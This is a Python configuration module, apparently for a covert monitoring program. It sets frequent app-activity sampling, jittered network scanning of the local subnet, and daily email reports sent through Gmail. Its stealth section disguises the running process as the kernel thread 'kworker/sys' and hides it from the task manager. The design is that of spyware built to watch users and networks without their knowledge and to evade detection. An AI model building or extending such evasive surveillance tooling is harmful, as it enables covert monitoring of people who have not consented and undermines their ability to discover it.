import os
import yaml
from typing import Optional
from pydantic import BaseModel, Field
from pydantic_settings import BaseSettings, SettingsConfigDict
from pathlib import Path

class GeneralConfig(BaseModel):
    report_time: str = "23:00"
    timezone: str = "UTC"
    data_retention_days: int = 30
    log_level: str = "WARNING"

class MonitoringConfig(BaseModel):
    app_sample_interval: int = 10   # 10-second real-time sampling (locked)
    system_sample_interval: int = 60
    idle_threshold: int = 300

class NetworkConfig(BaseModel):
    scan_interval: int = 180
    scan_jitter: int = 60
    scan_timeout: int = 2
    subnet: str = "auto"
    interface: str = "auto"
    enable_mdns: bool = True
    enable_ssdp: bool = True
    enable_netbios: bool = True

class EmailConfig(BaseModel):
    enabled: bool = True
    recipient: str = ""
    sender: str = ""
    smtp_server: str = "smtp.gmail.com"
    smtp_port: int = 587
    use_tls: bool = True
    gmail_app_password: Optional[str] = None

class StealthConfig(BaseModel):
    process_name: str = "kworker/sys"
    hide_from_taskmanager: bool = True

class Settings(BaseSettings):
    general: GeneralConfig = Field(default_factory=GeneralConfig)
    monitoring: MonitoringConfig = Field(default_factory=MonitoringConfig)
    network: NetworkConfig = Field(default_factory=NetworkConfig)
    email: EmailConfig = Field(default_factory=EmailConfig)
    stealth: StealthConfig = Field(default_factory=StealthConfig)

    model_config = SettingsConfigDict(
        env_file=".env",
        env_nested_delimiter="__",
        extra="ignore"
    )

    @classmethod
    def load(cls, config_path: str = "config.yaml"):
        """Loads configuration with precedence: Defaults < YAML < Env Vars"""
        path = Path(config_path)
        yaml_data = {}
        if path.exists():
            with open(path, "r") as f:
                yaml_data = yaml.safe_load(f) or {}
        
        # Merge YAML data into the model (Env vars will override via BaseSettings)
        # However, pydantic-settings doesn't natively merge a dict AND env vars in one go easily
        # with nested models without some help if we want exact precedence.
        # Simple way: Init with YAML, then env vars override.
        return cls(**yaml_data)

# Global settings instance
# Note: In production, you'd likely initialize this in main.py
# but for now we follow the singleton pattern requested.
try:
    settings = Settings.load()
except Exception:
    # Fallback to defaults if loading fails
    settings = Settings()
